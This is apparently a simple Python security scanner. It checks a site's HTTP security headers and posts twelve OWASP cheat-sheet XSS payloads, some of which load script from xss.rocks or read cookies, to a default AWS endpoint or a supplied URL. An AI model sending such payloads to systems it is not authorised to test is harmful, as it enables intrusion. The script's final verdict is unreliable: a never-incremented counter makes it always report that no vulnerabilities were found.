import requests
import argparse

# main driver function that gets http header info for target URL and checks for xss vulnerabilities
# argument --url: optional target URL to check for vulnerabilities
def main():
    # default target URL
    url = 'https://9u4xt4nqr1.execute-api.us-west-2.amazonaws.com/default/test'

    # parse args for user provided URL
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', type = str, help='target URL to check for vulnerabilities, \
        if not entered a default URL will be used')
    args = parser.parse_args()
    if args.url is not None:
        url = args.url
    print('Target URL:', url)
    print()

    # get header info and print
    response = requests.get(url)
    headers = response.headers
    for key in headers:
        print(key + ': ' + headers[key])
    print()
    
    # call test scripts
    check_headers(headers)
    print()
    test_xss_scripts(url)


# checks for inclusion of common HTTP security headers
def check_headers(headers):
    # see if X-XSS-Protection header is present
	try:
		if headers['X-XSS-Protection']:
			print('OKAY: X-XSS-Protection')
	except KeyError:
		print('WARNING: X-XSS-Protection header not found')
    
    # see if X-Content-Type-Options header is present and set to nosniff
	try:
		if headers['X-Content-Type-Options'].lower() == 'nosniff':
			print('OKAY: X-Content-Type-Options')
		else:
			print('WARNING: X-Content-Type-Options header not properly configured')
	except KeyError:
		print('WARNING: X-Content-Type-Options header not found')			
	
    # see if X-Frame-Options header is present and set to deny or sameorigin
	try:
		if 'deny' in headers['X-Frame-Options'].lower():
			print('OKAY: X-Frame-Options')
		elif 'sameorigin' in headers['X-Frame-Options'].lower():
			print('OKAY: X-Frame-Options')
		else:
			print('WARNING: X-Frame-Options header not properly configured')
	except KeyError:
		print('WARNING: X-Frame-Options header not found')
	
    # see if Strict-Transport-Security header is present
	try:
		if headers['Strict-Transport-Security']:
			print('OKAY: Strict-Transport-Security')
	except KeyError:
		print('WARNING: Strict-Transport-Security header not found')
	
    # see if Content-Security-Policy header is present
	try:
		if headers['Content-Security-Policy']:
			print('OKAY: Content-Security-Policy')
	except KeyError:
		print('WARNING: Content-Security-Policy header not found')


# post common xss test scripts to see if they are returned in http response
def test_xss_scripts(url):
    # script source: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
    test_scripts = [
        """<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>""", \
        """javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>""", \
        """<IMG SRC="javascript:alert('XSS');">""", \
        """<IMG SRC=JaVaScRiPt:alert('XSS')>""", \
        """<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>""", \
        """\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>""", \
        '''<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>''', \
        """<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>""", \
        """<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>""", \
        """<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>""", \
        """<iframe src=http://xss.rocks/scriptlet.html <""", \
        """</script><script>alert('XSS');</script>"""
    ]

    # post test scripts and check if text in response
    counter = 0
    for script in test_scripts:
        r = requests.post(url, json=script)
        if script.lower() in r.text.lower():
            print('WARNING: possible vulnerability found with ' + script)
    # if no text was found print completion message
    if counter == 0:
        print('No xss vulnerabilities found with test scripts')


# run main function
if __name__ == "__main__":
    main()